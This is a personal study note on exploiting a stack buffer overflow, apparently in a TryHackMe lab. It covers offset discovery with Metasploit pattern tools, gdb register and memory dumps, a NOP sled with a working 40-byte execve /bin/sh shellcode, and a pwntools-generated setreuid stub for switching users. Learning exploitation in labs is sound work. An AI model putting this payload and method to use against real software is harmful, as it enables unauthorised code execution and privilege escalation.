# Simple buffer overflow methodology

Here is a simple buffer overflow methodology for me to refer back to while I continue to learn this confusing topic.



## Calculate the offset
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200`

`(gdb) run 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'`

```
(gdb) i r
rax            0xc9	201
rbx            0x0	0
rcx            0x7ffff7b08894	140737348929684
rdx            0x7ffff7dd48c0	140737351862464
rsi            0x602260	6300256
rdi            0x0	0
rbp            0x6641396541386541	0x6641396541386541  <-------HERE IS THE PATTERN
rsp            0x7fffffffe2b8	0x7fffffffe2b8
r8             0x7ffff7fef4c0	140737354069184
r9             0x77	119
r10            0x5e	94
r11            0x246	582
r12            0x400450	4195408
r13            0x7fffffffe3b0	140737488348080
r14            0x0	0
r15            0x0	0
rip            0x400563	0x400563 <copy_arg+60>
eflags         0x10206	[ PF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0

```

`
└──╼$/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 6641396541386541
[*] Exact match at offset 144
`


## Get a shell code

Other samples [1](https://www.exploit-db.com/exploits/42179) and [2](https://www.exploit-db.com/exploits/41750)

A sample 40 byte shell code:
`\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05`




## Find the address of the shellcode

Use NOPs and pick an address in the NOPs to skip to the shellcode.

`(gdb) run $(python -c "print '\x90'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6")
`

```
(gdb) x/100x $rsp-200
0x7fffffffe228:	0x00400450	0x00000000	0xffffe3e0	0x00007fff
0x7fffffffe238:	0x00400561	0x00000000	0xf7dce8c0	0x00007fff
0x7fffffffe248:	0xffffe64d	0x00007fff	0x90909090	0x90909090 <----- Nops start here
0x7fffffffe258:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe268:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe278:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe288:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe298:	0x90909090	0x90909090	0x90909090	0x90909090 <----- The address I pick
0x7fffffffe2a8:	0x90909090	0x90909090	0x90909090	0x48583b6a <----- shellcode
0x7fffffffe2b8:	0xb849d231	0x69622f2f	0x68732f6e	0x08e8c149
0x7fffffffe2c8:	0x89485041	0x485752e7	0x050fe689	0x48583c6a
0x7fffffffe2d8:	0x050fff31	0x41414141	0x41414141	0x41414141
0x7fffffffe2e8:	0x42424242	0x00004242	0xffffe3e8	0x00007fff
0x7fffffffe2f8:	0x00000000	0x00000002	0x004005a0	0x00000000
0x7fffffffe308:	0xf7a4302a	0x00007fff	0x00000000	0x00000000
0x7fffffffe318:	0xffffe3e8	0x00007fff	0x00040000	0x00000002
```

Convert the address to little endian depending on system. `0x7fffffffe298` --> `0x98e2ffffff7f` --> `\x98\xe2\xff\xff\xff\x7f`

## Modify the shellcode

Using [Pwntools](https://docs.pwntools.com/en/stable/) you can generate hex instructions for your shellcode. In this example I needed to use setreuid() to become user3. 

```
┌──(root💀kali)-[/home/cornbread]
└─# pwn shellcraft -f d amd64.linux.setreuid 1003
\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
```

Paste this portion infront of the existing shellcode and adjust the number of NOPs to keep the offset the same.

Original [blog post](https://l1ge.github.io/tryhackme_bof1/) for buffer overflows used.
